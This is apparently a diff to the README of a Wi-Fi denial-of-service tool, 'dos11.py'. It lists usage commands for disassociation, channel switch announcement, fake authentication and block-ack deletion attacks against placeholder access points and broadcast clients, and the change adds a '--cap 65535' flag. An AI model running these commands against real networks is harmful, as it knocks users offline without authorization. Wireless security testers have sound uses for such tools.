@@ -28,7 +28,7 @@
 #### disassociation attack
     ./dos11.py disas  --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0
 #### channel switch announcement
-    ./dos11.py csa --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --switch-channel 1
+    ./dos11.py csa --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --switch-channel 1 --cap 65535
 #### fake auth 
     ./dos11.py fake_auth --client-mac  FF:FF:FF:FF:FF:FF --ap-ssid wifi-ssid --ap-bssid 01:02:03:04:05:06 -i wlan0 --auth-algorithm 1 --interval 0
 #### delete block ack (maybe not work)
